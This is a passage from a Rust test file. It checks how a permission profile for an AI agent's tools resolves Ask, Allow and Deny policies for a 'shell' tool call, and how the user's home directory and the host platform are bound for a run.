            false,
            ToolKind::Builtin,
            &rig.workdir
        ),
        ToolPolicy::Ask
    );
    let bare = YoloProfile::builtin_default();
    assert_eq!(
        apply_profile(
            Some(&bare),
            "shell",
            &args,
            ToolPolicy::Ask,
            false,
            ToolKind::Builtin,
            &rig.workdir
        ),
        ToolPolicy::Allow
    );
    let d = decide_under(
        Some(&bare),
        "shell",
        &args,
        ToolPolicy::Deny,
        false,
        ToolKind::Builtin,
        &rig.workdir,
    )
    .expect("a profile decides");
    assert_eq!(d.policy, ToolPolicy::Deny);
    // `~` in a real run is the user's home, which is what `for_run` binds.
    let input = DecideInput::for_run(
        "shell",
        &args,
        ToolPolicy::Ask,
        false,
        ToolKind::Builtin,
        &rig.workdir,
        Some(&rig.home),
    );
    assert_eq!(input.home, Some(rig.home.as_path()));
    assert_eq!(input.platform, Platform::host());
}
